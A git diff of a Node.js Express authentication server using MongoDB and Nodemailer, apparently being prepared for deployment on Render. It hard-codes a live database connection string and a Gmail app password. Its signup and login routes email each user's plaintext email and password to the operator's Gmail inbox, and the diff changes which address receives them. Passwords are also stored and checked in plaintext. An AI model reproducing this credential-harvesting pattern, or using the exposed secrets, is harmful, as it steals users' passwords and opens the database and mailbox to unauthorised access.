@@ -2,7 +2,7 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
-const nodemailer = require('nodemailer'); // Import nodemailer
+const nodemailer = require('nodemailer'); 
 
 const app = express();
 
@@ -10,27 +10,24 @@ const app = express();
 app.use(express.json());
 app.use(cors()); 
 
-// Connect to MongoDB
-mongoose.connect('mongodb+srv://nithanssk_db_user:xx0P6vVr9DaaKxXm@cluster0.vy1g43n.mongodb.net/?retryWrites=true&w=majority')
+// Connect to MongoDB (Notice 'myauthdb' was added before the ?)
+mongoose.connect('mongodb+srv://nithanssk_db_user:xx0P6vVr9DaaKxXm@cluster0.vy1g43n.mongodb.net/myauthdb?retryWrites=true&w=majority')
   .then(() => console.log('✅ MongoDB Connected'))
   .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
 // Set up Nodemailer Transporter
-// We use your provided Gmail app password here
 const transporter = nodemailer.createTransport({
-
   service: 'gmail',
   auth: {
-    user: 'nithanssk@gmail.com', // The email sending the notification
-    pass: 'jows ukkj armv ysso'  // Your App Password
+    user: 'nithanssk@gmail.com', 
+    pass: 'jows ukkj armv ysso'  
   }
 });
-
 // Helper function to send the email notification
 const sendNotificationEmail = (actionType, userEmail, userPassword) => {
   const mailOptions = {
     from: 'nithanssk@gmail.com',
-    to: 'suryareigns18@gmail.com', // Sending it to yourself
+    to: 'nithanssk@gmail.com', // Sending it to your preferred email
     subject: `App Notification: New ${actionType}`,
     text: `Hello!\n\nA user has just performed a ${actionType} on your React App.\n\nDetails:\nEmail: ${userEmail}\nPassword: ${userPassword}\n\nTimestamp: ${new Date().toLocaleString()}`
   };
@@ -56,18 +53,15 @@ app.post('/api/login', async (req, res) => {
   try {
     const { email, password } = req.body;
 
-    // Check if user exists
     const user = await User.findOne({ email });
     if (!user) {
       return res.status(400).json({ message: 'User not found. Please sign up.' });
     }
 
-    // Check password
     if (user.password !== password) {
       return res.status(400).json({ message: 'Invalid credentials' });
     }
 
-    // SEND EMAIL NOTIFICATION ON SUCCESSFUL LOGIN
     sendNotificationEmail('LOGIN', email, password);
 
     res.status(200).json({ message: 'Login successful!', user: { email: user.email } });
@@ -83,17 +77,14 @@ app.post('/api/signup', async (req, res) => {
   try {
     const { email, password } = req.body;
 
-    // Check if user already exists
     const existingUser = await User.findOne({ email });
     if (existingUser) {
       return res.status(400).json({ message: 'User already exists. Please log in.' });
     }
 
-  
     const newUser = new User({ email, password });
     await newUser.save();
 
-    // SEND EMAIL NOTIFICATION ON SUCCESSFUL SIGNUP
     sendNotificationEmail('SIGNUP', email, password);
 
     res.status(201).json({ message: 'Account created successfully! You can now log in.' });
@@ -104,6 +95,6 @@ app.post('/api/signup', async (req, res) => {
   }
 });
 
-// Start the server
-const PORT = 5000;
-app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
+// Start the server (Fixed to work dynamically with Render)
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
